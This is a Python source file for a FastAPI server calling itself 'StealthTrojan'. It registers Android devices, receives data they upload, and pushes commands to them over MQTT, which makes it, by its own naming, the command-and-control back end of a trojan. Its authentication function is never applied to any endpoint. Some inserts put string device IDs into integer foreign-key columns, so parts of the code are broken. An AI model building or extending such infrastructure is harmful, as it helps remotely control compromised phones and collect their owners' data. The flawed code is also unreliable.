"""
StealthTrojan Backend API
FastAPI + WebSocket + PostgreSQL + MQTT Broker
"""

import json
import time
import asyncio
from datetime import datetime
from typing import Optional
import secrets
import base64

from fastapi import FastAPI, HTTPException, Depends, WebSocket, WebSocketDisconnect, Query
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import psycopg2
import psycopg2.extras
import psycopg2.pool
import paho.mqtt.client as mqtt
from contextlib import contextmanager

app = FastAPI(title="StealthTrojan", version="1.0")

# ==================== Config ====================
DATABASE_CONFIG = {
    "host": "postgres",
    "port": 5432,
    "dbname": "stealth",
    "user": "postgres",
    "password": "***"
}

MQTT_BROKER = "mqtt"
MQTT_PORT = 1883
MQTT_TOPIC_PREFIX = "stealthtrojan/"

# WebSocket connections for real-time monitoring
active_connections = {}

# ==================== Database Connection Pool ====================
class DatabaseManager:
    def __init__(self):
        self.pool = None
    
    def connect(self):
        if self.pool is None:
            self.pool = psycopg2.pool.SimpleConnectionPool(
                1, 20,  # min 1, max 20 connections
                host=DATABASE_CONFIG["host"],
                port=DATABASE_CONFIG["port"],
                dbname=DATABASE_CONFIG["dbname"],
                user=DATABASE_CONFIG["user"],
                password=DATABASE_CONFIG["password"]
            )
        return self.pool.getconn()
    
    def release(self, connection):
        self.pool.putconn(connection)

db_manager = DatabaseManager()

# ==================== Database Initialization ====================
def init_db():
    """Initialize database tables"""
    conn = db_manager.connect()
    try:
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS devices (
                id SERIAL PRIMARY KEY,
                device_id VARCHAR(64) UNIQUE NOT NULL,
                device_name VARCHAR(128),
                device_type VARCHAR(32) DEFAULT 'android',
                status VARCHAR(32) DEFAULT 'inactive',
                last_seen TIMESTAMP,
                created_at TIMESTAMP DEFAULT NOW()
            );
            
            CREATE TABLE IF NOT EXISTS messages (
                id SERIAL PRIMARY KEY,
                device_id INTEGER REFERENCES devices(id),
                message_type VARCHAR(32) NOT NULL,
                payload JSONB,
                created_at TIMESTAMP DEFAULT NOW()
            );
            
            CREATE TABLE IF NOT EXISTS commands (
                id SERIAL PRIMARY KEY,
                device_id INTEGER REFERENCES devices(id),
                command VARCHAR(128) NOT NULL,
                params JSONB,
                status VARCHAR(32) DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT NOW()
            );
            
            CREATE TABLE IF NOT EXISTS logs (
                id SERIAL PRIMARY KEY,
                device_id INTEGER REFERENCES devices(id),
                log_type VARCHAR(32) NOT NULL,
                content TEXT,
                created_at TIMESTAMP DEFAULT NOW()
            );
            
            CREATE TABLE IF NOT EXISTS api_keys (
                id SERIAL PRIMARY KEY,
                api_key VARCHAR(64) UNIQUE NOT NULL,
                owner_name VARCHAR(128),
                permissions TEXT,
                created_at TIMESTAMP DEFAULT NOW()
            );
            
            -- Create indexes for better performance
            CREATE INDEX IF NOT EXISTS idx_messages_device_id ON messages(device_id);
            CREATE INDEX IF NOT EXISTS idx_commands_device_id ON commands(device_id);
            CREATE INDEX IF NOT EXISTS idx_logs_device_id ON logs(device_id);
            CREATE INDEX IF NOT EXISTS idx_messages_type ON messages(message_type);
        """)
        conn.commit()
        
        # Insert default admin API key
        cursor.execute("INSERT INTO api_keys (api_key, owner_name, permissions) VALUES (%s, %s, %s) ON CONFLICT (api_key) DO NOTHING",
            (generate_api_key(), "admin", "read,write"))
        
        print("Database initialized successfully")
    except Exception as e:
        print(f"DB init error: {e}")
    finally:
        db_manager.release(conn)

def generate_api_key():
    """Generate a new API key"""
    return base64.urlsafe_b64encode(secrets.token_bytes(32)).decode('ascii').rstrip('=')

def get_db():
    return db_manager.connect()

# ==================== MQTT ====================
def on_mqtt_message(client, userdata, message):
    """Handle incoming MQTT messages"""
    topic = message.topic
    payload = message.payload.decode()
    print(f"MQTT: {topic} -> {payload}")

mqtt_client = mqtt.Client()
mqtt_client.on_message = on_mqtt_message

# ==================== Pydantic Models ====================
class DeviceRegister(BaseModel):
    device_id: str
    device_name: str

class Command(BaseModel):
    device_id: str
    command: str
    params: dict = {}

class MessageResponse(BaseModel):
    device_id: str
    message_type: str = "report"
    payload: dict = {}

class CommandAck(BaseModel):
    command_id: int

class APIKeyAuth(BaseModel):
    api_key: str

class DeviceCommand(BaseModel):
    command: str
    params: dict = {}

# ==================== WebSocket Handlers ====================
@app.websocket("/ws/{client_id}")
async def websocket_endpoint(websocket: WebSocket, client_id: str):
    """WebSocket for real-time device monitoring"""
    await websocket.accept()
    active_connections[client_id] = websocket
    try:
        while True:
            data = await websocket.receive_text()
            # Process incoming data from device
            message = json.loads(data)
            await handle_device_message(client_id, message)
    except WebSocketDisconnect:
        active_connections.pop(client_id, None)

async def handle_device_message(client_id: str, message: dict):
    """Process incoming messages from devices"""
    message_type = message.get("type", "report")
    payload = message.get("payload", {})
    
    # Save to database
    conn = get_db()
    try:
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO messages (device_id, message_type, payload) VALUES (%s, %s, %s)",
            (client_id, message_type, json.dumps(payload))
        )
        conn.commit()
    except Exception as e:
        conn.rollback()
        print(f"Error saving message: {e}")
    finally:
        db_manager.release(conn)

# ==================== API Endpoints ====================
@app.on_event("startup")
def startup():
    init_db()
    try:
        mqtt_client.connect(MQTT_BROKER, MQTT_PORT, 60)
        mqtt_client.subscribe(f"{MQTT_TOPIC_PREFIX}#")
        mqtt_client.loop_start()
        print("MQTT client connected")
    except Exception as e:
        print(f"MQTT connection failed: {e}")

# CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ==================== Authentication Middleware ====================
async def get_api_key(api_key: Optional[str]):
    if not api_key:
        raise HTTPException(status_code=401, detail="API key required")
    conn = get_db()
    try:
        cursor = conn.cursor()
        cursor.execute("SELECT id FROM api_keys WHERE api_key = %s", (api_key,))
        result = cursor.fetchone()
        if not result:
            raise HTTPException(status_code=401, detail="Invalid API key")
        return api_key
    finally:
        db_manager.release(conn)

# ==================== Device Management APIs ====================
@app.post("/api/v1/device/register")
def register_device(device: DeviceRegister):
    """Register a new device"""
    conn = get_db()
    try:
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO devices (device_id, device_name, last_seen) VALUES (%s, %s, NOW()) ON CONFLICT (device_id) DO NOTHING",
            (device.device_id, device.device_name)
        )
        conn.commit()
        return {"status": "registered", "device_id": device.device_id}
    except Exception as e:
        conn.rollback()
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        db_manager.release(conn)

@app.post("/api/v1/device/{device_id}/heartbeat")
def device_heartbeat(device_id: str):
    """Device heartbeat"""
    conn = get_db()
    try:
        cursor = conn.cursor()
        cursor.execute(
            "UPDATE devices SET last_seen = NOW(), status = 'active' WHERE device_id = %s",
            (device_id,)
        )
        conn.commit()
        return {"status": "ok"}
    except Exception as e:
        conn.rollback()
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        db_manager.release(conn)

@app.get("/api/v1/device/list")
def list_devices():
    """List all devices"""
    conn = get_db()
    try:
        cursor = conn.cursor()
        cursor.execute(
            "SELECT id, device_id, device_name, device_type, status, last_seen, created_at FROM devices ORDER BY last_seen DESC"
        )
        rows = cursor.fetchall()
        return {"devices": rows}
    except Exception as e:
        conn.rollback()
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        db_manager.release(conn)

# ==================== Message APIs ====================
@app.post("/api/v1/device/{device_id}/upload")
def upload_message(device_id: str, msg: MessageResponse):
    """Device uploads data"""
    conn = get_db()
    try:
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO messages (device_id, message_type, payload) VALUES (%s, %s, %s) RETURNING id",
            (device_id, msg.message_type, json.dumps(msg.payload))
        )
        message_id = cursor.fetchone()[0]
        conn.commit()
        return {"status": "ok", "message_id": message_id}
    except Exception as e:
        conn.rollback()
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        db_manager.release(conn)

@app.post("/api/v1/device/{device_id}/message")
def device_message(device_id: str, msg: MessageResponse):
    """Device sends message to server"""
    conn = get_db()
    try:
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO messages (device_id, message_type, payload) VALUES (%s, %s, %s) RETURNING id",
            (device_id, "report", json.dumps(msg.payload))
        )
        message_id = cursor.fetchone()[0]
        conn.commit()
        return {"status": "ok", "message_id": message_id}
    except Exception as e:
        conn.rollback()
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        db_manager.release(conn)

@app.get("/api/v1/device/{device_id}/messages")
def get_device_messages(device_id: str, limit: int = 100):
    """Get messages for a device"""
    conn = get_db()
    try:
        cursor = conn.cursor()
        cursor.execute(
            "SELECT id, message_type, payload, created_at FROM messages WHERE device_id = %s ORDER BY created_at DESC LIMIT %s",
            (device_id, limit)
        )
        rows = cursor.fetchall()
        return {"messages": rows}
    except Exception as e:
        conn.rollback()
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        db_manager.release(conn)

# ==================== Command APIs ====================
@app.post("/api/v1/device/{device_id}/command")
def send_command(device_id: str, cmd: Command):
    """Send command to device"""
    conn = get_db()
    try:
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO commands (device_id, command, params) VALUES (%s, %s, %s) RETURNING id",
            (device_id, cmd.command, json.dumps(cmd.params))
        )
        command_id = cursor.fetchone()[0]
        conn.commit()
        
        # Publish command via MQTT
        topic = f"{MQTT_TOPIC_PREFIX}{device_id}/command"
        payload = {"command": cmd.command, "params": cmd.params}
        mqtt_client.publish(topic, json.dumps(payload))
        
        return {"status": "ok", "command_id": command_id}
    except Exception as e:
        conn.rollback()
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        db_manager.release(conn)

@app.get("/api/v1/device/{device_id}/commands")
def device_commands(device_id: str):
    """Get pending commands for a device"""
    conn = get_db()
    try:
        cursor = conn.cursor()
        cursor.execute(
            "SELECT id, command, params, status, created_at FROM commands WHERE device_id = %s AND status = 'pending' ORDER BY created_at",
            (device_id,)
        )
        rows = cursor.fetchall()
        return {"commands": rows}
    except Exception as e:
        conn.rollback()
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        db_manager.release(conn)

@app.post("/api/v1/device/{device_id}/command/ack")
def ack_command(device_id: str, command_id: int):
    """Acknowledge a command"""
    conn = get_db()
    try:
        cursor = conn.cursor()
        cursor.execute(
            "UPDATE commands SET status = 'executed' WHERE id = %s AND device_id = %s",
            (command_id, device_id)
        )
        conn.commit()
        return {"status": "ok"}
    except Exception as e:
        conn.rollback()
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        db_manager.release(conn)

# ==================== Logs APIs ====================
@app.post("/api/v1/device/{device_id}/log")
def add_log(device_id: str, log_type: str, content: str):
    """Add log entry"""
    conn = get_db()
    try:
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO logs (device_id, log_type, content) VALUES (%s, %s, %s)",
            (device_id, log_type, content)
        )
        conn.commit()
        return {"status": "ok"}
    except Exception as e:
        conn.rollback()
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        db_manager.release(conn)

@app.get("/api/v1/device/{device_id}/logs")
def get_logs(device_id: str, limit: int = 100):
    """Get logs for a device"""
    conn = get_db()
    try:
        cursor = conn.cursor()
        cursor.execute(
            "SELECT id, log_type, content, created_at FROM logs WHERE device_id = %s ORDER BY created_at DESC LIMIT %s",
            (device_id, limit)
        )
        rows = cursor.fetchall()
        return {"logs": rows}
    except Exception as e:
        conn.rollback()
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        db_manager.release(conn)

# ==================== Health Check ====================
@app.get("/api/health")
def health_check():
    return {"status": "ok", "service": "stealth-trojan"}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
